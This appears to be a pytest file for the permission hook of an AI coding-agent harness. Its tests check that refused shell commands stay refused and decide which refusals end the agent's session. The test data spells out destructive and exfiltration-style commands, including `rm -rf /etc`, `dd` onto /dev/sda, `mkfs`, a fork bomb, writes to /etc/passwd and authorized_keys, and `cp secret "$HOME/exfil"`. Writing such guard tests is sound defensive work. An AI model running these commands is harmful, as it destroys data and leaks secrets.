        # Real, out-of-worktree target — a genuine write, stays terminal.
        "sed -i 's/a/b/' /etc/passwd",
        # (mika#2565 superseded the former "in-worktree realfile.rs stays
        # terminal" case: a relative in-worktree `sed -i` substitution is now a
        # SURVIVABLE deny — see
        # ``test_mika2565_sed_i_in_worktree_is_survivable_but_still_refused``.)
        # cpp#154 D3 non-reopening: $HOME-as-~-respelling must NOT flip just
        # because this ticket touches the same lethality path.
        "sed -i 's/a/b/' $HOME/.bashrc",
        # A second, real target alongside /dev/null is a genuine write.
        "sed -i 's/a/b/' /dev/null realfile.rs",
        # /dev/null lookalikes stay fatal (cpp#130's own trailing-boundary
        # edges, reused verbatim).
        "sed -i 's/a/b/' /dev/nullified",
        "sed -i 's/a/b/' /dev/null/../etc/passwd",
        # Unrelated tier3-dangerous verbs, unaffected by this narrow carve.
        # (`chmod` is not itself a TIER3_PATTERNS/write-kind entry on this
        # HEAD — measured `False` pre-fix too — so it is not a valid negative
        # here and is intentionally not included.)
        "rm -rf x",
        "git push --force origin main",
        "bash -c 'id'",
    ],
)
def test_cpp203_negative_stays_terminal(cmd: str, tmp_path: Path) -> None:
    """Negative — both-directions proof. Nothing that was terminal before
    this fix stops being terminal: no widening of admission, no widening of
    the /dev/null recognition, and the class of tier3-dangerous commands
    this ticket does not touch is unaffected."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp203_handler_end_to_end_still_denied_but_survivable(
    tmp_path: Path,
) -> None:
    """Handler-level proof, mirroring
    `test_cpp201_handler_end_to_end_still_denied_but_survivable`: the exact
    mika#1686/mika#2532 incident command is REFUSED (never executed) AND
    non-terminal through the real `can_use_tool` callback — not merely at
    the unit level. A real-target control on the SAME `sed -i` verb stays
    refused AND terminal, proving the fix narrows lethality only, not
    admission."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    result = asyncio.run(
        handler("Bash", {"command": _MIKA_2532_EXACT_INCIDENT}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny), (
        "the sed -i /dev/null must STILL be refused — no widening of what "
        "is admitted"
    )
    assert result.interrupt is False, (
        "the refusal must be survivable — this is the real mika#1686/"
        "mika#2532 incident command, replayed verbatim"
    )

    real_target_control = asyncio.run(
        handler(
            "Bash",
            {"command": "sed -i 's/a/b/' /etc/passwd"},
            _mock_ctx(),
        )
    )
    assert isinstance(real_target_control, PermissionResultDeny)
    assert real_target_control.interrupt is True, (
        "the SAME verb, against a REAL target instead of /dev/null, stays "
        "terminal"
    )


def test_cpp203_non_reopening_cpp154_d3_cpp196_cpp201(tmp_path: Path) -> None:
    """Non-reopening smoke: cpp#154 D3's `$HOME`-as-`~`-respelling invariant,
    cpp#196's /tmp git-show-redirect carve-out, and cpp#201's mktemp-scratch
    carve-out are untouched by this ticket — `_SED_I_DEVNULL_RE` is a new,
    independent narrowing keyed on `sed -i`'s own file argument (no `<`/`>`
    character involved at all), disjoint from every redirect-based check
    those three tickets touch. Full suites for cpp#128/#130/#151/#154/#155/
    #157/#166/#176/#195/#196/#201 are unmodified and pass unchanged (see the
    plan doc's full-suite run)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    # cpp#154 D3: $HOME/$OLDPWD/$(...)/bare-$ respellings of `~` stay
    # terminal — unaffected by anything this ticket's sed-i carve touches.
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "echo hi > $HOME/.ssh/authorized_keys"}, wt
        )
        is True
    )
    # cpp#196: the /tmp git-show-redirect carve-out is still non-terminal.
    assert (
        permissions_module._denial_is_terminal(
            "Bash",
            {
                "command": (
                    "git show origin/main:crates/mika-common/src/home.rs "
                    "> /tmp/ck_home_main.rs 2>/dev/null || true"
                )
            },
            wt,
        )
        is False
    )
    # cpp#201: the mktemp-scratch heredoc/redirect carve-out is still
    # non-terminal.
    assert (
        permissions_module._denial_is_terminal(
            "Bash",
            {
                "command": (
                    'T=$(mktemp -d) ; cat >"$T/log" <<\'EOF\'\n'
                    '{"event":"turn_usage"}\nEOF'
                )
            },
            wt,
        )
        is False
    )


# ── cpp#205 (mika#1686 generalization, case a): default SURVIVABLE ─────────
#
# Prime + Vincent ratified "Oui. A" (2026-09-26). `_denial_is_terminal` was
# ALREADY built as "default False (survivable), terminal only on an
# enumerated True-path" — cpp#128's own construction. cpp#205 retargets WHICH
# True-paths are trusted:
#
#   * REMOVED: `is_tier3_dangerous_for_lethality`'s own trailing generic
#     bare-`>`/`>>` catch-all. It named a FILE TARGET, which the cwd-aware
#     destination-veto calls below can PROVE safe or unsafe — the purely
#     lexical, cwd-free check could not, and measurably over-refused an
#     ABSOLUTE-BUT-IN-WORKTREE redirect target for ANY verb (the
#     mika#1719/cpp#176 shape, generalized beyond the four write-kinds
#     cpp#176 already fixed for cp/mv/mkdir/git-show).
#   * ADDED: `chmod -R`/`chown -R`/`dd`/`mkfs`/`truncate`/a fork bomb —
#     measured ALREADY non-terminal pre-cpp#205 (an under-terminal gap; see
#     `tests/test_tier1.py::TestCpp205ProvenDangerVerbLethality`).
#
# This module's tests exercise the AGGREGATE (`_denial_is_terminal`);
# `tests/test_tier1.py` exercises the underlying `is_tier3_dangerous_for_
# lethality` retargeting in isolation, including every "cpp#205 LEGITIMATE
# FLIP" non-regression pin for the redirect-target cases this file's
# cpp#154/#176/#195/#196/#201/#203 tests already covered end-to-end.


def _cpp205_wt(tmp_path: Path) -> str:
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    return str(worktree)


# The four mika#1686 comment 5844642872 deny-death instances, replayed
# verbatim against `_denial_is_terminal`.
_MIKA_1686_INSTANCE_1_SED_I_DEVNULL_GREP = (
    "sed -i 's/.../ X/' /dev/null; grep -n \"created_by_session\" crates/m.rs"
)
_MIKA_1686_INSTANCE_4_FOR_LOOP = (
    "for t in test_a test_b; do printf '%s\\n' \"$t\"; done"
)


def _mika_1686_instance_2_3_cwd_probe(wt: str) -> str:
    return (
        f"cd /tmp && rm -rf {wt}-probe && mkdir {wt}-probe2 && "
        f"chmod 000 {wt}-probe2 && sh -c 'echo hi'"
    )


def test_cpp205_mika1686_instance1_sed_i_devnull_grep_survivable(
    tmp_path: Path,
) -> None:
    """#1 — sed -i /dev/null (no-op) followed by an innocent grep. Must be
    SURVIVABLE (non-terminal); the command stays DENIED (sed -i is not
    admitted). Already fixed by cpp#203; this ticket must not reopen it."""
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_1686_INSTANCE_1_SED_I_DEVNULL_GREP}, wt
        )
        is False
    )


def test_cpp205_mika1686_instance4_for_loop_survivable_or_allowed(
    tmp_path: Path,
) -> None:
    """#4 — a plain read-only for-loop. Already allow/survivable on this
    HEAD (not a class this ticket needed to touch); pinned so a future
    change cannot silently regress it."""
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_1686_INSTANCE_4_FOR_LOOP}, wt
        )
        is False
    )


def test_cpp205_mika1686_instance2_3_cwd_probe_stays_terminal(
    tmp_path: Path,
) -> None:
    """#2/#3 — `cd /tmp && rm -rf <probe> && mkdir <probe2> && chmod 000
    <probe2> && sh -c '...'`. MUST STAY TERMINAL (case a): the `rm -rf` and
    `sh -c` destructive/unprovable verbs, and the `chmod 000` compound also
    resolves outside the worktree (a separate, independent proven-danger
    path). This is the accepted cost case (a) names explicitly: a few
    legitimate reformulations traded against zero undetected escapes."""
    wt = _cpp205_wt(tmp_path)
    cmd = _mika_1686_instance_2_3_cwd_probe(wt)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    )


# ── Both-directions battery ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf x",
        "rm -fr /etc",
        "chmod -R 777 /etc",
        "chmod --recursive 777 x",  # even an in-worktree target — case (a), regardless of target
        "chown -R nobody /etc",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "truncate -s 0 /etc/passwd",
        ":(){ :|:& };:",
        "sed -i 's/a/b/' /etc/passwd",  # sed -i on a REAL out-of-worktree target
        "bash -c 'id'",
        "sh -c 'id'",
        "eval 'id'",
        "git push --force origin main",
        "git reset --hard",
    ],
)
def test_cpp205_proven_danger_stays_terminal_both_worlds(
    cmd: str, tmp_path: Path
) -> None:
    """Proven-danger battery — destructive verbs, regardless of target."""
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "> /etc/passwd",
        "echo hi > /etc/passwd",
    ],
)
def test_cpp205_resolvable_redirect_out_of_worktree_stays_terminal(
    cmd: str, tmp_path: Path
) -> None:
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp205_out_of_worktree_write_stays_terminal(tmp_path: Path) -> None:
    wt = _cpp205_wt(tmp_path)
    outside = str(tmp_path / "outside")
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": f"cp README.md {outside}/x"}, wt
        )
        is True
    )


def test_cpp205_control_plane_path_stays_terminal(tmp_path: Path) -> None:
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "echo hi > .git/hooks/pre-commit"}, wt
        )
        is True
    )


def test_cpp205_home_respelling_stays_terminal_d3_non_reopening(
    tmp_path: Path,
) -> None:
    """cpp#154 D3: `$HOME`/`${HOME}`/`$OLDPWD` respellings of `~` stay
    terminal — non-reopening, explicit."""
    wt = _cpp205_wt(tmp_path)
    for cmd in (
        "echo hi > $HOME/x",
        "echo hi > ${HOME}/.bashrc",
        "echo hi > $OLDPWD/y",
    ):
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
            is True
        ), cmd


def test_cpp205_sed_i_on_real_out_of_worktree_file_stays_terminal(
    tmp_path: Path,
) -> None:
    """Exact battery item named by the dispatch: `sed -i` on a real
    out-of-worktree file stays terminal (only the /dev/null no-op is
    survivable, cpp#203 unchanged)."""
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "sed -i 's/a/b/' /etc/passwd"}, wt
        )
        is True
    )


# Survivable battery — the non-destructive syntactic over-refusals.
@pytest.mark.parametrize(
    "cmd",
    [
        # Read chains / diagnostics.
        'echo "label"; grep -rn foo .',
        "for d in a b c; do echo \"=== $d ===\"; done",
        # No-op sed -i /dev/null, composed with an innocent read (cpp#203).
        "sed -i 's/a/b/' /dev/null; grep -n foo bar.rs",
        # Composed research pipes.
        "some_script.sh | tail && git status",
        "cat notes.txt | grep foo",
    ],
)
def test_cpp205_syntactic_overrefusals_default_survivable(
    cmd: str, tmp_path: Path
) -> None:
    wt = _cpp205_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is False
    ), cmd


# ── The mika#1719/cpp#176-class fix, generalized beyond cp/mv/mkdir/git-show ─


def _non_tmp_worktree() -> Path:
    """A real, existing worktree directory whose OWN absolute path does NOT
    start with the literal text `/tmp/` — load-bearing for the two tests
    below. `tmp_path` (pytest's own fixture) resolves under the system temp
    dir, which on this platform IS `/tmp`, so `f"{tmp_path}/out"` would
    ALREADY be exempted by the pre-existing, unrelated `/tmp/`-prefix carve
    (cpp#143/#154) regardless of this ticket's fix — not a discriminating
    test. `/var/tmp` is a different literal path (the codebase's `/tmp/`
    carve is a literal-text check, not a semantic "is a scratch dir" check),
    so a worktree rooted there exercises the ACTUAL cpp#176-class bug this
    ticket fixes: an absolute, non-`/tmp/`-prefixed target that nonetheless
    resolves inside the worktree."""
    wt = Path("/var/tmp") / f"cpp205-wt-{uuid.uuid4().hex[:12]}"
    (wt / ".git").mkdir(parents=True)
    return wt


def test_cpp205_absolute_in_worktree_redirect_now_survivable_any_verb() -> None:
    """THE actual bug cpp#205's audit found: an absolute redirect target that
    resolves INSIDE the worktree, from a GENERIC verb (`/usr/bin/time`, not
    one of cp/mv/mkdir/git-show, which cpp#176 already covered), was
    incorrectly terminal via `is_tier3_dangerous_for_lethality`'s own
    (purely lexical, cwd-free) generic bare-`>` pattern — even though the
    write never left the worktree. Red on pre-cpp#205 HEAD (measured `True`);
    green after."""
    wt = _non_tmp_worktree()
    try:
        cmd = (
            "/usr/bin/time -v cargo build --release --features telemetry "
            f"--bin mika-spirit > {wt}/out"
        )
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, str(wt))
            is False
        )
    finally:
        shutil.rmtree(wt, ignore_errors=True)


def test_cpp205_absolute_out_of_worktree_redirect_any_verb_stays_terminal() -> None:
    """Negative control for the fix above: an absolute redirect target that
    does NOT resolve inside the worktree, from the same generic verb, stays
    terminal — the fix is containment-aware, not a blanket exemption for
    absolute paths."""
    wt = _non_tmp_worktree()
    try:
        cmd = "/usr/bin/time -v cargo build --release > /var/outside-cpp205/out"
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, str(wt))
            is True
        )
    finally:
        shutil.rmtree(wt, ignore_errors=True)


# ── Explicit default-survivable pin ──────────────────────────────────────────


def test_cpp205_unrecognized_denied_shape_defaults_survivable(
    tmp_path: Path,
) -> None:
    """The DEFAULT, pinned directly: an arbitrary, never-enumerated command
    shape that policy denies (unknown verb, no redirect, no escape) is
    survivable with NO per-shape carve-out required — this is the fall-
    through branch's own behavior, not a lookup table."""
    wt = _cpp205_wt(tmp_path)
    for cmd in (
        "some-tool-nobody-allow-listed --flag value",
        "curl https://example.com/api",
        "npm run some-arbitrary-script",
    ):
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
            is False
        ), cmd


# ── Non-reopening smoke: cpp#154 D3 / #176 / #195 / #196 / #201 / #203 ──────


def test_cpp205_non_reopening_154d3_176_195_196_201_203(tmp_path: Path) -> None:
    wt = _cpp205_wt(tmp_path)
    cases: list[tuple[str, bool]] = [
        # cpp#154 D3.
        ("echo hi > $HOME/.ssh/authorized_keys", True),
        # cpp#176 (absolute target resolving inside the worktree, cp/mv/mkdir/
        # git-show write-kinds specifically).
        (f"cp README.md {wt}/copy.md", False),
        # cpp#195/#196 (git-show /tmp carve-out).
        (
            "git show origin/main:crates/mika-common/src/home.rs "
            "> /tmp/ck_home_main.rs 2>/dev/null",
            False,
        ),
        # cpp#201 (mktemp-scratch heredoc carve-out).
        ('T=$(mktemp -d) ; cat >"$T/log" <<\'EOF\'\nx\nEOF', False),
        # cpp#203 (sed -i /dev/null carve-out).
        ("sed -i 's/a/b/' /dev/null; grep -n foo bar.rs", False),
    ]
    for cmd, expected in cases:
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
            is expected
        ), cmd


def test_cpp205_handler_end_to_end_new_verbs_still_denied_but_survivable(
    tmp_path: Path,
) -> None:
    """Handler-level proof for the NEW verb set: `chmod -R` is REFUSED (never
    executed — admission is untouched) AND survivable (session continues)
    through the real `can_use_tool` callback."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    result = asyncio.run(
        handler("Bash", {"command": "chmod -R 777 /etc"}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny), (
        "chmod -R must still be refused — no widening of admission"
    )
    assert result.interrupt is True, (
        "chmod -R is the NEW proven-danger verb set (case a) — terminal"
    )


# ────────────────────────────────────────────────────────────────────────────
# cpp#209 — cp/mv DESTINATION-ARGUMENT write-kind (`bash-cp-mv`) mktemp-scratch
# carve-out: the residual class cpp#201 named but did not close.
#
# cpp#201 carved the mktemp-scratch idiom (`VAR=$(mktemp …)` … `> "$VAR/…"`)
# out of LETHALITY for write-kind `bash-redirect` only. The SAME idiom applied
# to a `cp`/`mv` DESTINATION ARGUMENT (write-kind `bash-cp-mv`) never got the
# carve — named as the cause of pilot 1b6c4d70's death on mika#2054 (cpp#209
# body).
#
# Established at source (probed on this branch's HEAD, matching the ticket's
# cited 8877dd6 — cpp#207, in between, touches only tier1 admission and is
# disjoint from this code path): unlike a redirect, `bash-cp-mv`'s
# containment question has NO cwd-independent, always-terminal trigger —
# `is_tier3_dangerous_for_lethality`'s bare-`>` pattern has no cp/mv analog.
# The ONLY terminal trigger for `bash-cp-mv` is `is_within_project`'s
# cwd-dependent resolve: measured on an EXISTING worktree, a clean
# (non-traversing) `$VAR`-rooted cp/mv destination is ALREADY (accidentally)
# treated as contained by `is_within_project` (Python does no shell
# expansion, so `"$D/"` reads as an ordinary same-named subdirectory) and
# never reaches a veto at all — `_denial_is_terminal` measures `False` on
# THIS class even on unfixed `main`, when `cwd` resolves. When `cwd` does
# NOT resolve — `Path(cwd).resolve(strict=True)` raising, e.g. a worktree
# torn down mid-session, the exact shape of the mika#2054 incident window —
# `is_within_project` fails closed to `False` UNCONDITIONALLY, for every
# destination alike (its own documented fail-closed branch), and
# `_denial_is_terminal` returns `True`. THAT is the reproducible,
# non-vacuous red-before/green-after trigger every positive test below
# uses; the existing-worktree world is covered separately (as an
# already-non-terminal sanity check and as the world every negative case
# must also stay terminal in). See the cpp#209 plan doc's "Cause established
# at source" section for the full measurement in both cwd worlds, before and
# after this fix.
# ────────────────────────────────────────────────────────────────────────────

_MIKA_2054_FULL_COMMAND = (
    'D=$(mktemp -d) ; cp crates/mika-agent/src/*.rs "$D/" ; '
    "printf '{\"event\":\"turn_usage\"}' >> \"$D/mod.rs\" ; "
    'bash scripts/verify.sh "$D"'
)
_MIKA_2054_CP_ALONE = 'D=$(mktemp -d) ; cp crates/mika-agent/src/*.rs "$D/"'
_MIKA_2054_MV_ALONE = 'D=$(mktemp -d) ; mv crates/mika-agent/src/lib.rs "$D/"'


def _torn_down_worktree(tmp_path: Path) -> str:
    """A worktree path that existed and was removed — `Path(cwd).resolve(
    strict=True)` raises `OSError`, so `is_within_project` fails closed to
    `False` for EVERY destination (its own documented fail-closed branch),
    reproducing the mika#2054 incident window (a worktree that stopped
    resolving mid-session) without depending on the accident that a clean
    `$VAR`-rooted cp/mv destination is otherwise (wrongly) read as contained
    by `is_within_project` when `cwd` DOES resolve — see this section's
    header comment."""
    worktree = tmp_path / "wt"
    worktree.mkdir(parents=True)
    shutil.rmtree(worktree)
    return str(worktree)


def test_cpp209_denial_is_terminal_mika_2054_replay_survivable(
    tmp_path: Path,
) -> None:
    """Positive — the exact mika#2054 incident shape (cp to a same-command
    mktemp-scratch dir, followed by the redirect append cpp#201 already
    covers, followed by the tracked-script invocation cpp#207 covers). Must
    become NON-terminal. Red-before this fix (measured `True` on pre-fix
    HEAD — see the plan doc)."""
    wt = _torn_down_worktree(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2054_FULL_COMMAND}, wt
        )
        is False
    )


def test_cpp209_denial_is_terminal_cp_mv_alone_survivable(tmp_path: Path) -> None:
    """Positive — `cp x "$D/"` and `mv x "$D/"` alone (AC1's explicit ask),
    isolating that the fix is about the cp/mv destination itself, not about
    the compound shape or the trailing redirect cpp#201 already carves."""
    wt = _torn_down_worktree(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2054_CP_ALONE}, wt
        )
        is False
    )
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2054_MV_ALONE}, wt
        )
        is False
    )


def test_cpp209_unassigned_dollar_var_stays_terminal(tmp_path: Path) -> None:
    """Anti-vacuity negative: WITHOUT the `D=$(mktemp -d)` assignment
    anywhere in the command, `"$D/"` is exactly as unresolvable as `$HOME/x`
    and must stay terminal — proves the carve-out is keyed on the provable
    mktemp origin, not on the mere presence of `$` (mirrors cpp#201's own
    `test_cpp201_unassigned_dollar_var_stays_terminal`)."""
    wt = _torn_down_worktree(tmp_path)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": 'cp crates/mika-agent/src/lib.rs "$D/"'}, wt
        )
        is True
    )


@pytest.mark.parametrize(
    "cmd",
    [
        # Resolvable, proven out-of-worktree, non-mktemp — stays terminal,
        # in BOTH cwd worlds (AC2).
        "cp crates/mika-agent/src/lib.rs /etc/y",
        "cp crates/mika-agent/src/lib.rs /var/outside/x",
        # Genuinely dangerous verbs — unrelated to this write-destination
        # class, unaffected.
        "rm -rf x",
        "sed -i 's/a/b/' /etc/f",
        "git push --force origin main",
        # cpp#154 D3 — the ratified `$HOME`-as-`~`-respelling protection
        # (via `mv`, this ticket's own verb pair) — must NOT flip.
        'mv crates/mika-agent/src/lib.rs "$HOME/z"',
        # A DIFFERENT variable than the one assigned from mktemp — proximity
        # must not exempt it.
        'D=$(mktemp -d) ; cp crates/mika-agent/src/lib.rs "$OTHER/log"',
        # A traversal riding a legitimate scratch-var prefix.
        'D=$(mktemp -d) ; cp crates/mika-agent/src/lib.rs "$D/../../etc/passwd"',
    ],
)
def test_cpp209_negative_stays_terminal_torn_down_cwd(
    cmd: str, tmp_path: Path
) -> None:
    """Negative, torn-down-worktree world — both-directions proof. Nothing
    that was terminal before this fix stops being terminal in the SAME cwd
    world the positive tests use."""
    wt = _torn_down_worktree(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "cp crates/mika-agent/src/lib.rs /etc/y",
        "cp crates/mika-agent/src/lib.rs /var/outside/x",
        "rm -rf x",
        'D=$(mktemp -d) ; cp crates/mika-agent/src/lib.rs "$D/../../etc/passwd"',
    ],
)
def test_cpp209_negative_stays_terminal_existing_cwd(
    cmd: str, tmp_path: Path
) -> None:
    """Same negatives, EXISTING-worktree world — this fix must not change
    the verdict in the cwd world where cp/mv containment already worked
    (the traversal case is vetoed by `is_within_project` itself there, not
    by this ticket's carve — see the header comment)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp209_handler_end_to_end_still_denied_but_survivable(
    tmp_path: Path,
) -> None:
    """Handler-level proof: the mika#2054 cp/mv-alone shape is REFUSED
    (never executed) AND non-terminal through the real `can_use_tool`
    callback — not merely at the unit level. Uses the SAME torn-down-worktree
    cwd the unit-level positive tests use (a worktree that stopped resolving
    is the reproducible trigger — see this section's header comment)."""
    wt = _torn_down_worktree(tmp_path)
    handler = _bundled_handler(cwd=wt)

    result = asyncio.run(handler("Bash", {"command": _MIKA_2054_CP_ALONE}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny), (
        "the cp/mv-to-mktemp-scratch write must STILL be refused — no "
        "widening of what is admitted"
    )
    assert result.interrupt is False, (
        "the refusal must be survivable — this is the mika#2054 incident "
        "shape"
    )

    unassigned_control = asyncio.run(
        handler(
            "Bash",
            {"command": 'cp crates/mika-agent/src/lib.rs "$D/"'},
            _mock_ctx(),
        )
    )
    assert isinstance(unassigned_control, PermissionResultDeny)
    assert unassigned_control.interrupt is True, (
        "the SAME target shape, without a same-command mktemp assignment, "
        "stays terminal"
    )


def test_cpp209_admission_unaffected_for_lethality_false(tmp_path: Path) -> None:
    """Admission-identity, SUPERSEDED BY cpp#211 for the `$`/`~`-rooted class.

    cpp#209 asserted the REFUSAL question (`for_lethality=False`) for a
    `$VAR`-rooted cp/mv destination was byte-identical before and after
    (`None` when `cwd` resolved, "resolves outside" when it did not) — i.e.
    exactly what `is_within_project` alone decided. cpp#211 root cause 2
    CLOSES that: a `$`/`~`-rooted cp/mv destination is now disqualified
    LEXICALLY, before `is_within_project`, for BOTH questions — so the
    refusal veto is the cpp#211 anti-respelling reason and, being lexical, is
    the SAME in both cwd worlds (`$D/` is squarely in cpp#211's ratified
    `$`-rooted class). The mktemp-scratch LETHALITY survivability the rest of
    this cpp#209 section proves is UNCHANGED — it lives on `for_lethality=
    True` and is re-asserted at the end here."""
    wt_gone = _torn_down_worktree(tmp_path)
    worktree = tmp_path / "wt2"
    (worktree / ".git").mkdir(parents=True)
    wt_here = str(worktree)

    cpp211_reason = (
        "destination '$D/' is rooted at an unresolved variable/tilde ($/~) "
        "— treated as not contained (cpp#211 / cpp#154 D3 anti-respelling)"
    )

    reason_gone = permissions_module._destination_veto_reason(
        _MIKA_2054_CP_ALONE, wt_gone, for_lethality=False
    )
    assert reason_gone == cpp211_reason

    # cpp#211: no longer `None` — the accident of `is_within_project` reading
    # `"$D/"` as a same-named in-worktree subdir is exactly what root cause 2
    # closes, so an EXISTING worktree vetoes it too now (cwd-independent).
    reason_here = permissions_module._destination_veto_reason(
        _MIKA_2054_CP_ALONE, wt_here, for_lethality=False
    )
    assert reason_here == cpp211_reason

    # cpp#209 core purpose intact: the mktemp-scratch idiom stays SURVIVABLE
    # under the LETHALITY question (the carve-out `continue`s before cpp#211's
    # lexical veto), in both cwd worlds.
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2054_CP_ALONE}, wt_gone
        )
        is False
    )
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2054_CP_ALONE}, wt_here
        )
        is False
    )


def test_cpp209_non_reopening_154d3_176_195_196_201_203_205(
    tmp_path: Path,
) -> None:
    """Non-reopening smoke, existing-worktree world (mirrors
    `test_cpp205_non_reopening_154d3_176_195_196_201_203`, unmodified
    cases). cpp#207 is not replayed here — it is an admission-only
    (`is_tier1_auto_approve`/tier1.py) change, structurally disjoint from
    `_denial_is_terminal`/`_destination_veto_reason` (permissions.py), which
    this ticket's diff is entirely confined to."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    cases: list[tuple[str, bool]] = [
        # cpp#154 D3.
        ("echo hi > $HOME/.ssh/authorized_keys", True),
        # cpp#176 (absolute target resolving inside the worktree).
        (f"cp README.md {wt}/copy.md", False),
        # cpp#195/#196 (git-show /tmp carve-out).
        (
            "git show origin/main:crates/mika-common/src/home.rs "
            "> /tmp/ck_home_main.rs 2>/dev/null",
            False,
        ),
        # cpp#201 (mktemp-scratch heredoc carve-out).
        ('T=$(mktemp -d) ; cat >"$T/log" <<\'EOF\'\nx\nEOF', False),
        # cpp#203 (sed -i /dev/null carve-out).
        ("sed -i 's/a/b/' /dev/null; grep -n foo bar.rs", False),
        # cpp#205 (proven-danger verb set, case a).
        ("chmod -R 777 /etc", True),
    ]
    for cmd, expected in cases:
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
            is expected
        ), cmd


# ── cpp#211 — quoted $/~-rooted cp/mv destination: veto + terminality ────────
#
# Root cause 2 (this module's layer): `_destination_veto_reason` handed the
# shlex-stripped destination straight to `is_within_project`, which does no
# shell expansion — so `Path(cwd) / "$HOME/x"` (or `"~/x"`) read as a literal
# same-named in-worktree subdir and returned veto=None. cpp#211 disqualifies a
# `$`/`~`-LEADING cp/mv destination LEXICALLY, before `is_within_project`, for
# BOTH the REFUSAL and the LETHALITY question — the same cpp#154 D3
# anti-respelling doctrine already applied to redirect targets. Scoped to a
# `$`/`~` leading root only, so a leading-`/` absolute path that resolves
# INSIDE the worktree stays admitted (cpp#176) and a contained name with a
# space is not newly refused. The cpp#201/#209 mktemp-scratch LETHALITY
# carve-out still `continue`s before this veto, so its survivability is intact
# (proven in `test_cpp209_admission_unaffected_for_lethality_false`).

_CPP211_ROOTED_CP_MV = [
    'cp secret "$HOME/exfil"',
    'mv secret "$HOME/exfil"',
    'cp secret "${HOME}/exfil"',
    "cp x '$HOME/y'",
    'cp x "~/y"',
    'mv x "~/y"',
    # Bare forms — same shlex-stripped dest, must veto identically.
    "cp secret $HOME/exfil",
    "cp x ~/y",
]


@pytest.mark.parametrize("cmd", _CPP211_ROOTED_CP_MV)
def test_cpp211_destination_veto_refuses_rooted(cmd: str, tmp_path: Path) -> None:
    """Positive (the fix): `_destination_veto_reason` returns a veto for every
    quoted or bare `$`/`~`-rooted cp/mv destination, in an EXISTING worktree
    (where the pre-fix `is_within_project` accident wrongly read it as
    contained). Cwd-independent — the veto is lexical."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert permissions_module._destination_veto_reason(cmd, wt) is not None, cmd


@pytest.mark.parametrize("cmd", _CPP211_ROOTED_CP_MV)
def test_cpp211_denial_is_terminal_rooted(cmd: str, tmp_path: Path) -> None:
    """`$HOME`/`~`-rooted cp/mv is TERMINAL (matches the ratified
    `$HOME`-stays-terminal invariant, cpp#154 D3 / cpp#157, and the redirect
    side). Existing worktree, so the verdict is not an artifact of a torn-down
    cwd."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


@pytest.mark.parametrize(
    "cmd",
    [
        # Quoted CONTAINED destinations strictly under the worktree — veto=None.
        'cp x "subdir/y"',
        'cp x "./build/z"',
        'mv old "nested/new"',
        # A quoted name with a space is contained, not disqualified.
        'cp x "a b"',
        # Unquoted contained.
        "cp src/a.rs src/b.rs",
    ],
)
def test_cpp211_destination_veto_admits_contained(cmd: str, tmp_path: Path) -> None:
    """Negative / both-directions: a QUOTED contained cp/mv destination is NOT
    vetoed (quoting alone is never a refusal). Only `$`/`~`-rooting flips."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert permissions_module._destination_veto_reason(cmd, wt) is None, cmd


